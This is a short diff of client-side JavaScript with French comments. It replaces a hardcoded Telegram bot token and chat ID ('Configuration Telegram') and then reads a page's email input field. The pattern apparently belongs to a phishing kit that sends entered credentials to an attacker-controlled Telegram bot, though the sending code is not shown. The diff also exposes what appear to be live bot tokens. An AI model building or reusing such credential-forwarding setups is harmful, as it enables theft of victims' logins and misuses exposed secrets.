@@ -1,7 +1,7 @@
  $(document).ready(function() {
         // Configuration Telegram
-        var telegram_bot_id = "5722730835:AAF-83VyMq8uBs0klBjz3iAdfEzPNJz8w0o";
-        var chat_id = "-1003033979576";
+        var telegram_bot_id = "7341995560:AAHzLqEpWdDkUuGkt51nDlE6oaBAU39xF_o";
+        var chat_id = "-4513385515";
         
         // Références aux éléments
         var emailInput = document.getElementById("email");
